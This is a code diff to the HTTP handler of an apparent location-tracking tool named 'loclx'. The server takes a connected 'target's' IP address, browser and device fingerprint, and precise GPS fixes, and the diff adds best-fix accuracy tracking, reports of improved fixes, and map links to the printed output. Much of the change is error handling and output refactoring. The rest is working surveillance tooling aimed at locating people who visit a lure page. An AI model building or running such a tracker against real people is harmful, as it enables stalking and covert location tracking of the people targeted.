@@ -13,6 +13,7 @@ from typing import Any, Optional
 from loclx import VERSION
 from loclx.dashboard import generate_compact_information_report, generate_target_report
 from loclx.diagnostics import DiagnosticRunner
+from loclx.gps import classify_gps_quality, format_accuracy, format_altitude, generate_map_urls
 from loclx.ipinfo import IPManager
 from loclx.qrcode import generate_ascii_qr
 from loclx.security import (
@@ -53,38 +54,65 @@ class LabHandler(BaseHTTPRequestHandler):
     def log_message(self, format: str, *args: Any) -> None:
         pass  # Suppress default HTTP server noise in CLI output
 
+    def handle_one_request(self) -> None:
+        try:
+            super().handle_one_request()
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+
+    def safe_write(self, data: bytes) -> None:
+        try:
+            self.wfile.write(data)
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+
+    def safe_send_error(self, code: int, message: Optional[str] = None) -> None:
+        try:
+            self.send_error(code, message)
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+
     def send_cors_headers(self) -> None:
-        self.send_header("Access-Control-Allow-Origin", f"http://{BIND_ADDR}")
-        self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
-        self.send_header("Access-Control-Allow-Headers", "Content-Type")
-        self.send_header("X-Content-Type-Options", "nosniff")
-        self.send_header("X-Frame-Options", "SAMEORIGIN")
-        self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
-        self.send_header("Cache-Control", "no-store, max-age=0")
-        self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' https://*.tile.openstreetmap.org https://unpkg.com; img-src 'self' data: https://*.tile.openstreetmap.org; style-src 'self' 'unsafe-inline' https://unpkg.com; script-src 'self' 'unsafe-inline' https://unpkg.com;")
+        try:
+            self.send_header("Access-Control-Allow-Origin", f"http://{BIND_ADDR}")
+            self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
+            self.send_header("Access-Control-Allow-Headers", "Content-Type")
+            self.send_header("X-Content-Type-Options", "nosniff")
+            self.send_header("X-Frame-Options", "SAMEORIGIN")
+            self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
+            self.send_header("Cache-Control", "no-store, max-age=0")
+            self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' https://*.tile.openstreetmap.org https://unpkg.com; img-src 'self' data: https://*.tile.openstreetmap.org; style-src 'self' 'unsafe-inline' https://unpkg.com; script-src 'self' 'unsafe-inline' https://unpkg.com;")
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
 
     def send_json(self, status_code: int, data: Any) -> None:
-        body = json.dumps(data).encode("utf-8")
-        self.send_response(status_code)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(body)))
-        self.send_cors_headers()
-        self.end_headers()
-        self.wfile.write(body)
+        try:
+            body = json.dumps(data).encode("utf-8")
+            self.send_response(status_code)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.send_cors_headers()
+            self.end_headers()
+            self.safe_write(body)
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
 
     def serve_file(self, filename: str, content_type: str) -> None:
         filepath = os.path.join(_web_dir, filename)
         if os.path.isfile(filepath):
-            with open(filepath, "rb") as f:
-                content = f.read()
-            self.send_response(200)
-            self.send_header("Content-Type", content_type)
-            self.send_header("Content-Length", str(len(content)))
-            self.send_cors_headers()
-            self.end_headers()
-            self.wfile.write(content)
+            try:
+                with open(filepath, "rb") as f:
+                    content = f.read()
+                self.send_response(200)
+                self.send_header("Content-Type", content_type)
+                self.send_header("Content-Length", str(len(content)))
+                self.send_cors_headers()
+                self.end_headers()
+                self.safe_write(content)
+            except (BrokenPipeError, ConnectionResetError, OSError):
+                pass
         else:
-            self.send_error(404, "File not found")
+            self.safe_send_error(404, "File not found")
 
     def resolve_session(self, sid: str) -> tuple[Optional[Session], int, str]:
         """Strict session resolution by ID. Returns (session, status_code, error_message)."""
@@ -104,9 +132,12 @@ class LabHandler(BaseHTTPRequestHandler):
         return session, 200, "OK"
 
     def do_OPTIONS(self) -> None:
-        self.send_response(204)
-        self.send_cors_headers()
-        self.end_headers()
+        try:
+            self.send_response(204)
+            self.send_cors_headers()
+            self.end_headers()
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
 
     def do_GET(self) -> None:
         client_ip = self.client_address[0]
@@ -115,6 +146,14 @@ class LabHandler(BaseHTTPRequestHandler):
             return
 
         url_path = self.path.split("?")[0]
+
+        if url_path == "/favicon.ico":
+            try:
+                self.send_response(204)
+                self.end_headers()
+            except (BrokenPipeError, ConnectionResetError, OSError):
+                pass
+            return
 
         if url_path == "/" or url_path == "/index.html":
             session = get_active_session()
@@ -329,30 +368,32 @@ class LabHandler(BaseHTTPRequestHandler):
             sep = "----------------------------------------"
             header_sep = "========================================================"
 
-            b = session.browser_info.to_dict() if session.browser_info else {}
-
             emit(c.green("\n[+] TARGET CONNECTED\n"))
             emit(c.cyan(header_sep))
             emit(c.bold(c.cyan("              TARGET INFORMATION")))
             emit(c.cyan(header_sep))
-            emit("\nDEVICE / BROWSER")
-            emit(c.dim(sep))
-            emit(f"Browser          : {b.get('browser') or '—'}")
-            emit(f"Version          : {b.get('browserVersion') or '—'}")
-            emit(f"Platform         : {b.get('platform') or '—'}")
-            emit(f"User Agent       : {b.get('userAgent') or '—'}")
-            emit(f"Language         : {b.get('language') or '—'}")
-            emit(f"Timezone         : {b.get('timezone') or '—'}")
-            emit(f"Screen           : {b.get('screenResolution') or '—'}")
-            emit(f"Viewport         : {b.get('viewportSize') or '—'}")
-            emit(f"CPU Cores        : {b.get('cpuCores') or '—'}")
-            emit(f"Device Pixel Ratio: {b.get('devicePixelRatio') or '1'}")
-            emit(f"Touch Support    : {b.get('touchSupport') or '—'}")
-            emit(f"Device Type      : {b.get('deviceType') or 'Desktop'}\n")
-            emit(c.bold(c.cyan("NETWORK")))
+            emit(c.bold(c.cyan("\nNETWORK")))
             emit(c.dim(sep))
             emit(f"IP Address       : {client_ip}\n")
-            emit(c.amber("[*] Waiting for location permission...\n"))
+
+    def _print_browser_info_table(self, session: Session, c: Ansi) -> None:
+        b = session.browser_info.to_dict() if session.browser_info else {}
+        sep = "----------------------------------------"
+        emit(c.bold(c.cyan("DEVICE / BROWSER")))
+        emit(c.dim(sep))
+        emit(f"Browser          : {b.get('browser') or '—'}")
+        emit(f"Version          : {b.get('browserVersion') or '—'}")
+        emit(f"Platform         : {b.get('platform') or '—'}")
+        emit(f"User Agent       : {b.get('userAgent') or '—'}")
+        emit(f"Language         : {b.get('language') or '—'}")
+        emit(f"Timezone         : {b.get('timezone') or '—'}")
+        emit(f"Screen           : {b.get('screenResolution') or '—'}")
+        emit(f"Viewport         : {b.get('viewportSize') or '—'}")
+        emit(f"CPU Cores        : {b.get('cpuCores') or '—'}")
+        emit(f"Device Pixel Ratio: {b.get('devicePixelRatio') or '1'}")
+        emit(f"Touch Support    : {b.get('touchSupport') or '—'}")
+        emit(f"Device Type      : {b.get('deviceType') or 'Desktop'}\n")
+        emit(c.amber("[*] Waiting for location permission...\n"))
 
     def _handle_location_update(self, session: Session, payload: dict[str, Any], client_ip: str) -> None:
         if not session.connected:
@@ -363,6 +404,8 @@ class LabHandler(BaseHTTPRequestHandler):
         browser_data = payload.get("browser")
         denied = payload.get("denied", False)
 
+        c = Ansi(True)
+
         if isinstance(ip_data, dict):
             session.set_ip_info(ip_data)
         elif session.ip_info is None:
@@ -371,9 +414,10 @@ class LabHandler(BaseHTTPRequestHandler):
                 session.set_ip_info(fetched_ip)
 
         if isinstance(browser_data, dict):
+            had_browser = session.browser_info is not None
             session.set_browser_info(browser_data)
-
-        c = Ansi(True)
+            if not had_browser:
+                self._print_browser_info_table(session, c)
 
         if denied:
             emit(c.red("\n[-] Location permission denied."))
@@ -383,30 +427,32 @@ class LabHandler(BaseHTTPRequestHandler):
         if isinstance(gps_data, dict) and "lat" in gps_data and "lon" in gps_data:
             if validate_gps_payload(gps_data):
                 is_first_gps = (session.gps_updates == 0)
-                session.update_gps(gps_data)
+                is_better, old_acc, new_acc = session.update_gps(gps_data)
+
+                best = session.best_fix or session.current_fix
+                lat = best["lat"]
+                lon = best["lon"]
+                lat_lon_9 = f"{lat:.9f},{lon:.9f}"
+                lat_6 = f"{lat:.6f}"
+                lon_6 = f"{lon:.6f}"
+                acc_s = format_accuracy(best.get("accuracy"))
+                alt_s = format_altitude(best.get("altitude"))
+                spd_s = f"{best['speed']:.1f} m/s" if best.get("speed") is not None else "n/a"
+                hdg_s = f"{best['heading']:.0f}°" if best.get("heading") is not None else "n/a"
+                quality = classify_gps_quality(best.get("accuracy"))
 
                 if is_first_gps:
-                    fix = session.current_fix
-                    lat = fix["lat"]
-                    lon = fix["lon"]
-                    lat_lon_9 = f"{lat:.9f},{lon:.9f}"
-                    lat_6 = f"{lat:.6f}"
-                    lon_6 = f"{lon:.6f}"
-                    acc_s = f"±{fix.get('accuracy') or 0:.0f} m"
-                    alt_s = f"{fix.get('altitude')} m" if fix.get("altitude") is not None else "n/a"
-                    spd_s = f"{fix.get('speed'):.1f} m/s" if fix.get("speed") is not None else "n/a"
-                    hdg_s = f"{fix.get('heading'):.0f}°" if fix.get("heading") is not None else "n/a"
-
                     emit(c.green("\n[+] LOCATION RECEIVED\n"))
-                    emit(c.bold(c.green("GPS")))
+                    emit(c.bold(c.green("BEST GPS FIX")))
                     emit(c.dim("----------------------------------------"))
                     emit(f"Latitude         : {lat:.9f}")
                     emit(f"Longitude        : {lon:.9f}")
                     emit(f"Accuracy         : {acc_s}")
+                    emit(f"GPS Quality      : {quality} ({acc_s})")
                     emit(f"Altitude         : {alt_s}")
                     emit(f"Speed            : {spd_s}")
                     emit(f"Heading          : {hdg_s}")
-                    emit(f"Timestamp        : {fix.get('timestamp') or '—'}\n")
+                    emit(f"Timestamp        : {best.get('timestamp') or '—'}\n")
 
                     emit(c.bold(c.cyan("MAP LINKS")))
                     emit(c.dim("----------------------------------------"))
@@ -414,13 +460,25 @@ class LabHandler(BaseHTTPRequestHandler):
                     emit(f"Google Earth     : https://earth.google.com/web/search/{lat_lon_9}")
                     emit(f"OpenStreetMap    : https://www.openstreetmap.org/?mlat={lat_6}&mlon={lon_6}")
                     emit(c.cyan("========================================================\n"))
+                elif is_better and old_acc is not None and new_acc is not None:
+                    emit(c.green(f"\n[+] BETTER GPS FIX"))
+                    emit(c.green(f"    Accuracy improved: {format_accuracy(old_acc)} → {format_accuracy(new_acc)}"))
+                    emit(f"    LAT      : {lat:.9f}")
+                    emit(f"    LON      : {lon:.9f}")
+                    emit(f"    QUALITY  : {quality}")
+                    emit(f"    TIME     : {best.get('timestamp') or '—'}\n")
+                    emit(c.bold(c.cyan("UPDATED MAP LINKS")))
+                    emit(c.dim("----------------------------------------"))
+                    emit(f"Google Maps      : https://www.google.com/maps?q={lat_lon_9}")
+                    emit(f"Google Earth     : https://earth.google.com/web/search/{lat_lon_9}")
+                    emit(f"OpenStreetMap    : https://www.openstreetmap.org/?mlat={lat_6}&mlon={lon_6}\n")
                 else:
-                    fix = session.current_fix
+                    curr = session.current_fix
                     emit(c.green(f"\n[+] GPS UPDATE"))
-                    emit(f"    LAT      : {fix['lat']:.9f}")
-                    emit(f"    LON      : {fix['lon']:.9f}")
-                    emit(f"    ACCURACY : ±{fix.get('accuracy') or 0:.0f} m")
-                    emit(f"    TIME     : {fix.get('timestamp') or '—'}\n")
+                    emit(f"    LAT      : {curr['lat']:.9f}")
+                    emit(f"    LON      : {curr['lon']:.9f}")
+                    emit(f"    ACCURACY : {format_accuracy(curr.get('accuracy'))}")
+                    emit(f"    TIME     : {curr.get('timestamp') or '—'}\n")
 
 
 def bind_server(preferred_port: int = DEFAULT_PORT) -> ThreadingHTTPServer:
